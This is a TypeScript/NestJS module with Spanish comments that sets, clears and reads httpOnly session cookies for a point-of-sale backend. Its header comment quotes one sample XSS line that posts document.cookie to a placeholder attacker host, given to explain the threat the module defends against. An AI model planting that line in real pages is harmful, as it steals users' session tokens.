import { ConfigService } from '@nestjs/config';
import type { CookieOptions, Request, Response } from 'express';

/**
 * COOKIES DE SESIÓN httpOnly.
 *
 * ─── EL PROBLEMA QUE CIERRA ───
 * Hasta la Fase 4 los tokens vivían en cookies escritas por el navegador y
 * legibles desde JavaScript (`useCookie` en Nuxt). Eso significa que cualquier
 * XSS —una dependencia comprometida, un campo mal escapado, una extensión
 * maliciosa— podía hacer:
 *
 *     fetch('https://atacante/', { method: 'POST', body: document.cookie })
 *
 * y llevarse la sesión COMPLETA de un usuario con permisos de gerencia: cobrar,
 * anular ventas, ver el libro de controlados. Un token robado así vale hasta que
 * caduque, y el usuario legítimo no nota absolutamente nada.
 *
 * Con `httpOnly`, `document.cookie` no devuelve nada: el navegador guarda la
 * credencial y la adjunta él mismo en cada petición, pero ningún script puede
 * leerla. No elimina el XSS —un atacante todavía puede actuar EN la sesión
 * mientras la pestaña está abierta— pero le quita lo peor: la persistencia. Deja
 * de poder exfiltrar la credencial y usarla más tarde, desde otra máquina.
 *
 * ─── POR QUÉ NO SE USA `cookie-parser` ───
 * Escribir cookies (`res.cookie`) ya viene en Express. La única pieza que falta
 * es LEERLAS, y para dos cookies son diez líneas. Añadir una dependencia —con su
 * cadena transitiva, sus avisos de seguridad y su mantenimiento— para eso no
 * pasa el filtro de "coste operativo" del playbook.
 */

/** Credencial de acceso. Vida corta (15 min por defecto). */
export const ACCESS_COOKIE = 'access_token';

/** Credencial de renovación. Sólo viaja al endpoint que la necesita. */
export const REFRESH_COOKIE = 'refresh_token';

/**
 * Marca LEGIBLE por JavaScript que indica "hay una sesión".
 *
 * No contiene el token ni nada derivado de él: su valor es `1`. Existe porque el
 * frontend necesita saber, de forma SÍNCRONA, si debe pintar la aplicación o
 * mandar al login. Sin ella, el middleware de rutas tendría que consultar
 * `/auth/me` en cada navegación, y en un punto de venta —donde el cajero salta
 * de pantalla constantemente— eso es una ida y vuelta al servidor por clic.
 *
 * El peor caso si un atacante la lee o la falsifica es que el front crea que hay
 * sesión cuando no la hay: la primera petición real devuelve 401 y el flujo de
 * sesión expirada se encarga. No concede ningún acceso.
 */
export const SESSION_MARKER_COOKIE = 'session_active';

/**
 * Ruta de la cookie de refresco.
 *
 * Acotarla al endpoint que la usa reduce la superficie: la credencial de mayor
 * valor —la que permite emitir tokens nuevos— deja de viajar en CADA petición
 * al API y sólo se envía cuando toca renovar. Si un proxy, un log de servidor o
 * un volcado de tráfico captura peticiones normales, el refresh token no está
 * ahí.
 */
export const REFRESH_COOKIE_PATH = '/api/auth/refresh';

export interface OpcionesDeSesion {
  /** Caducidad absoluta pactada al iniciar sesión. */
  refreshExpiresAt: Date;
  /** Vida del access token en milisegundos. */
  accessMaxAgeMs: number;
}

/** Base común de todas las cookies de sesión, derivada de la configuración. */
function baseDeCookie(config: ConfigService): CookieOptions {
  // `secure` OBLIGA a HTTPS. Se lee de configuración porque en desarrollo la
  // terminal corre en http://localhost y una cookie `secure` sería descartada
  // por el navegador: la sesión no funcionaría y el síntoma (401 en bucle) no
  // apunta a la causa.
  const secure = config.get<string>('COOKIE_SECURE', 'false') === 'true';

  // `lax` sirve cuando el front y el API comparten sitio (mismo dominio o
  // distinto puerto de localhost). Si se despliegan en dominios distintos hace
  // falta `none`, que a su vez EXIGE `secure`.
  const sameSite = config.get<'lax' | 'strict' | 'none'>(
    'COOKIE_SAME_SITE',
    'lax',
  );

  const domain = config.get<string>('COOKIE_DOMAIN') || undefined;

  return {
    httpOnly: true,
    secure,
    sameSite,
    domain,
  };
}

/**
 * Escribe las cookies de sesión en la respuesta.
 *
 * @param res respuesta de Express (usar `@Res({ passthrough: true })`)
 */
export function emitirCookiesDeSesion(
  res: Response,
  config: ConfigService,
  tokens: { accessToken: string; refreshToken: string },
  opciones: OpcionesDeSesion,
): void {
  const base = baseDeCookie(config);

  // El maxAge del refresh se deriva de la caducidad REAL de la fila en la base.
  // Calcularlo aparte abre la puerta a que la cookie sobreviva al token que
  // contiene: 401 en bucle sin explicación posible para el cajero.
  const refreshMaxAgeMs = Math.max(
    60_000,
    opciones.refreshExpiresAt.getTime() - Date.now(),
  );

  res.cookie(ACCESS_COOKIE, tokens.accessToken, {
    ...base,
    path: '/',
    maxAge: opciones.accessMaxAgeMs,
  });

  res.cookie(REFRESH_COOKIE, tokens.refreshToken, {
    ...base,
    path: REFRESH_COOKIE_PATH,
    maxAge: refreshMaxAgeMs,
  });

  // La marca NO es httpOnly: el front tiene que poder leerla. Y no lleva nada
  // secreto, justamente por eso.
  res.cookie(SESSION_MARKER_COOKIE, '1', {
    ...base,
    httpOnly: false,
    path: '/',
    maxAge: refreshMaxAgeMs,
  });
}

/**
 * Borra las cookies de sesión.
 *
 * `clearCookie` sólo funciona si recibe los MISMOS `path`, `domain` y `sameSite`
 * con los que se escribió la cookie. Con un `path` distinto el navegador crea
 * una cookie nueva vacía y deja viva la original: el usuario cree que cerró
 * sesión y su credencial sigue siendo válida. Por eso todo sale de `baseDeCookie`.
 */
export function limpiarCookiesDeSesion(
  res: Response,
  config: ConfigService,
): void {
  const base = baseDeCookie(config);

  res.clearCookie(ACCESS_COOKIE, { ...base, path: '/' });
  res.clearCookie(REFRESH_COOKIE, { ...base, path: REFRESH_COOKIE_PATH });
  res.clearCookie(SESSION_MARKER_COOKIE, {
    ...base,
    httpOnly: false,
    path: '/',
  });
}

/**
 * Lee una cookie de la cabecera `Cookie` sin depender de `cookie-parser`.
 *
 * Detalles que importan y que un `split(';')` ingenuo se salta:
 *   - el valor puede contener `=` (un JWT no, pero no queremos una utilidad que
 *     sólo funcione con JWT), así que sólo se parte por el PRIMER `=`;
 *   - los valores viajan percent-encoded;
 *   - un valor mal codificado no debe tumbar la petición: se devuelve tal cual.
 */
export function leerCookie(req: Request, nombre: string): string | null {
  const cabecera = req.headers?.cookie;
  if (!cabecera) return null;

  for (const parte of cabecera.split(';')) {
    const separador = parte.indexOf('=');
    if (separador === -1) continue;

    if (parte.slice(0, separador).trim() !== nombre) continue;

    const valor = parte.slice(separador + 1).trim();
    try {
      return decodeURIComponent(valor);
    } catch {
      return valor;
    }
  }

  return null;
}
